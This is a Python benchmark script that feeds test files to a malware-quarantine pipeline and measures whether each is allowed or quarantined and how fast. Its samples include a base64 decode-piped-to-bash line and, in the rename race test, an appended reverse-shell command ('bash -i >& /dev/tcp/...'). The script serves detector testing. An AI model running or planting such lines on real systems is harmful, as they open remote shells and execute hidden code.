#!/usr/bin/env python3
import json
import os
import statistics
import subprocess
import time
from pathlib import Path

DROPZONE = Path("/tmp/monitored_dropzone")
METRICS_FILE = Path("/var/ossec/logs/pipeline_metrics.jsonl")
LEDGER_SCRIPT = Path("/var/ossec/active-response/bin/audit_ledger.py")

def wait_for_records(expected_count: int, timeout: float = 10.0) -> list[dict]:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if METRICS_FILE.exists():
            lines = METRICS_FILE.read_text(encoding="utf-8").strip().splitlines()
            if len(lines) >= expected_count:
                return [json.loads(x) for x in lines]
        time.sleep(0.25)
    return [json.loads(x) for x in METRICS_FILE.read_text(encoding="utf-8").strip().splitlines()] if METRICS_FILE.exists() else []

def main() -> None:
    if METRICS_FILE.exists():
        METRICS_FILE.unlink()

    time.sleep(2.0)

    tiers = [
        ("Tier 1: Benign Baseline", "benign", "print('hello world')\n", "ALLOWED"),
        ("Tier 2: Synthetic Dropper", "dropper", "#!/bin/bash\n# ETH_SSRF_SYNTHETIC_DROPPER_V1\necho test\n", "QUARANTINED"),
        ("Tier 3: Base64 Obfuscated", "obfuscated", "#!/bin/bash\necho ZWNobyB0ZXN0 | base64 -d | bash\n", "QUARANTINED"),
    ]

    results = []
    total_expected = 0

    for label, prefix, content, expected_action in tiers:
        latencies = []
        hits = 0
        trials = 3
        for i in range(trials):
            f = DROPZONE / f"{prefix}_{i}.sh"
            f.write_text(content, encoding="utf-8")
            total_expected += 1
            recs = wait_for_records(total_expected)
            if len(recs) >= total_expected:
                latest = recs[-1]
                if latest["action"] == expected_action:
                    hits += 1
                latencies.append(latest["total_ms"])
            time.sleep(0.5)
        mean_lat = f"{statistics.mean(latencies):.2f} ms" if latencies else "N/A"
        results.append((label, f"{hits}/{trials}", mean_lat))

    race_hits = 0
    race_lat = []
    for i in range(3):
        stage_file = DROPZONE / f"report_{i}.pdf"
        final_file = DROPZONE / f"race_payload_{i}.sh"
        stage_file.write_text("harmless header\n", encoding="utf-8")
        os.rename(stage_file, final_file)
        with final_file.open("a", encoding="utf-8") as f:
            f.write("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        total_expected += 1
        recs = wait_for_records(total_expected)
        if len(recs) >= total_expected and recs[-1]["action"] == "QUARANTINED":
            race_hits += 1
            race_lat.append(recs[-1]["total_ms"])
        time.sleep(0.5)
    results.append(("Tier 4: Rapid-Rename Race", f"{race_hits}/3", f"{statistics.mean(race_lat):.2f} ms" if race_lat else "N/A"))

    print("\n### Empirical Benchmark Results (Copy into README.md)\n")
    print("| Evaluation Tier | Expected Outcome | Pass Rate | Mean Containment Latency |")
    print("| :--- | :--- | :---: | :---: |")
    for label, rate, lat in results:
        exp = "ALLOWED" if "Benign" in label else "QUARANTINED"
        print(f"| {label} | `{exp}` | {rate} | {lat} |")

    print("\n### Cryptographic Audit Ledger Verification\n")
    subprocess.run(["sudo", "python3", str(LEDGER_SCRIPT), "--verify"], check=False)

if __name__ == "__main__":
    main()
